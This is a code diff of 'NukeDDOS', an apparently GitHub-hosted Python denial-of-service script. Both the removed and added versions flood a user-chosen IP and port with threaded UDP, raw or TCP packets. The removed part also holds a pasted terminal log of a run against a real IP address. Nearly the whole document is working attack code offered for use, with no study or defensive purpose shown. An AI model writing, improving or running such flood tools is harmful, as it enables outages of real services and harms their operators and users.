@@ -3,95 +3,88 @@ import time
 import socket
 import random
 import threading
+import struct
+from datetime import datetime
 
-def optimize_system():
-    try:
-        os.nice(-20)
-    except:
-        pass
+# Packet types for flexibility (convertido para tuple imutável)
+PACKET_TYPES = (
+    ("UDP", socket.SOCK_DGRAM),
+    ("RAW", socket.SOCK_RAW),
+    ("ICMP", socket.SOCK_RAW),
+    ("TCP", socket.SOCK_STREAM)
+)
 
-    try:
-        socket.SO_SNDBUF = 1024 * 1024
-    except:
-        pass
+# Configuration interface (otimizado para uma única chamada de sistema)
+os.system("clear && figlet -f slant NukeDDOS")
+print("Author   : Laila19\ngithub   : https://github.com/lailacypher\n")
+ip = input("Target IP : ").strip()
+port = int(input("Port      : ").strip())
+threads = int(input("Threads   : ").strip())
 
-os.system("clear")
-print("""
-███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ ██████╗  ██████╗ ███████╗
-████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝
-██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██║  ██║██║  ██║██║   ██║███████╗
-██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██║  ██║██║  ██║██║   ██║╚════██║
-██║ ╚████║╚██████╔╝██║  ██╗███████╗██████╔╝██████╔╝╚██████╔╝███████║
-╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝   
+# Packet type selection (otimizado com enumerate direto)
+print("\nSelect packet type:")
+for i, (packet_name, _) in enumerate(PACKET_TYPES, 1):
+    print(f"{i}. {packet_name}")
+type_choice = int(input("Packet Type (1-4): ").strip()) - 1
+packet_name, sock_type = PACKET_TYPES[type_choice]
 
-Target IP: 172.67.213.24
-Port: 443
-Threads (recomendado 500+): 10
-Traceback (most recent call last):
-  File "/home/kali/Importante/PaineisGITHUB/NukeDDOS/NukeDDOS.py", line 42, in <module>
-    optimize_system()
-    ~~~~~~~~~~~~~~~^^
-  File "/home/kali/Importante/PaineisGITHUB/NukeDDOS/NukeDDOS.py", line 22, in optimize_system
-    bpf = struct.pack('HL', len(program), ctypes.create_string_buffer(bytes(program)))
-                                                                      ~~~~~^^^^^^^^^
-ValueError: bytes must be in range(0, 256)
-                                                                                                                                                                                                                                            
-┌──(laila19㉿phdsec)-[~/Importante/PaineisGITHUB/NukeDDOS]
-└─$ 
+# Socket setup (pré-alocação de recursos)
+sock = socket.socket(socket.AF_INET, sock_type, socket.IPPROTO_UDP if packet_name == "UDP" else 0)
+sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+data = random._urandom(2048)  # Mantido conforme original
+sent = 0
+lock = threading.Lock()
 
+# Progress bar otimizado (sem sleeps desnecessários)
+os.system("clear && figlet Attack Starting")
+progress = ["[                    ] 0%", "[=====               ] 25%", 
+            "[==========          ] 50%", "[===============     ] 75%", 
+            "[====================] 100%"]
+print("\n".join(progress))
 
+# Random IP generation (otimizado com geração direta)
+def random_ip():
+    return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
 
-
-   
-""")
-
-target = input("Target IP: ").strip()
-port = int(input("Port: ").strip())
-thread_count = int(input("Threads (recommended 500+): ").strip())
-packet_size = 65507
-
-optimize_system()
-random.seed(time.time())
-data = random._urandom(packet_size)
-
-socks = []
-for _ in range(min(100, thread_count)):
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, packet_size)
-        socks.append(s)
-    except:
-        pass
-
-def flood():
+# Função de ataque otimizada (pré-formatado strings e reduzido overhead)
+def attack():
+    global sent
+    target = (ip, port)
+    packet_base = data
+    local_sock = socket.socket(socket.AF_INET, sock_type, socket.IPPROTO_UDP if packet_name == "UDP" else 0)
+    local_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    
     while True:
         try:
-            for s in socks:
-                fake_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
-                
-                for _ in range(50):
-                    try:
-                        s.sendto(data, (target, port))
-                    except:
-                        pass
-                
-                try:
-                    s.sendto(data[:1024], (target, port))
-                    s.sendto(data[1024:2048], (target, port))
-                    s.sendto(data[2048:3072], (target, port))
-                except:
-                    pass
-        except:
-            pass
+            fake_ip = random_ip()
+            # Packet construction otimizado
+            packet = packet_base + fake_ip.encode()
+            
+            # Envio em lote (mais eficiente)
+            for _ in range(5):
+                local_sock.sendto(packet[:512], target)
+                local_sock.sendto(packet[512:1024], target)
+                local_sock.sendto(packet[1024:1536], target)
+                local_sock.sendto(packet[1536:], target)
+            
+            # Atualização de contagem thread-safe
+            with lock:
+                sent += 5
+                if sent % 100 == 0:  # Reduz frequência de logs
+                    print(f"Packets {sent} sent to {ip}:{port} from {fake_ip}")
+                    
+        except Exception as e:
+            print(f"Error: {str(e)[:50]}")  # Log reduzido
 
-print("\nStarting nuclear attack...")
-for _ in range(thread_count):
-    try:
-        threading.Thread(target=flood, daemon=True).start()
-    except:
-        pass
+# Thread pool otimizado
+threads = min(threads, 1000)  # Previne overload
+for _ in range(threads):
+    thread = threading.Thread(target=attack, daemon=True)
+    thread.start()
 
-print(f"Attacking {target}:{port} with {thread_count} threads")
-while True:
-    time.sleep(1)
+# Mantém threads ativas
+try:
+    while True:
+        time.sleep(1)
+except KeyboardInterrupt:
+    print("\nAttack stopped by user")
